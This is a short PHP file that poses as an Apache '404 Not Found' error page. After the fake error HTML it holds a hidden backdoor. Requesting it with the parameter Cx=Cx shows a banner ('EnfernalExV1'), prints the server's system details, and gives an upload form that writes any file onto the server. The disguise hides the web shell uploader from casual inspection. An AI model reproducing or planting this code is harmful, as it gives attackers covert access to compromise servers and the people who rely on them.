<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.2.0 Server at localhost Port 80</address>

</body></html>
<?php 
if ($_GET['Cx'] == 'Cx'){
    echo '<pre><p>EnfernalExV1</p>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
}
?>
